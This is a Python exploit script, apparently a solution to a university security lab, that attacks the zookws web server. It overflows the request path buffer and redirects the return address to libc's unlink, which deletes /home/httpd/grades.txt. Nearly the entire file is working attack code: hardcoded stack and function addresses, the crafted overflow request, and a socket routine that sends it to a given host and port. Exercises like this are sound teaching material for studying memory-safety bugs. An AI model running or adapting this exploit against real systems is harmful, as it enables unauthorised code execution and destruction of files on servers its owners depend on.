#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0x34567890
stack_saved_ebp = 0xbfffde08
stack_retaddr = stack_saved_ebp + 4
serve_none_addr = 0x80495ea
unlink_addr = 0x40101630

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)

    # the path to the file we want to delete
    filename = "/home/httpd/grades.txt"
    # address for http_serve_none so handler is called successfully
    # and we can call the address we inserted at the return address
    serve_none = struct.pack("<I", serve_none_addr)
    # the address of the unlink function we will use to delete the file
    unlink = struct.pack("<I", unlink_addr)
    # our string will be at the end of the URI so it's null terminated
    # the address for our string will be 12B from the return address addr:
    # 4B (return address: unlink) + 4B (fake return addr) + 4B (address of our string)
    arg_addr = stack_retaddr + 12

    # our request will fill up all of pn, put the address of http_serve_none in handler so the function is called successfully, fill up 12B on the way to 
    # the return address, write the addr of unlink, write a fake ret addr above our call to unlink, write a pointer to our string above this addr, and finally write the string 
    req =   "GET /" + "A"*(1008) + serve_none + "B"*12 + unlink + "REKT" + struct.pack("<I", arg_addr) + filename + " HTTP/1.0\r\n" + \
            "\r\n"
    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

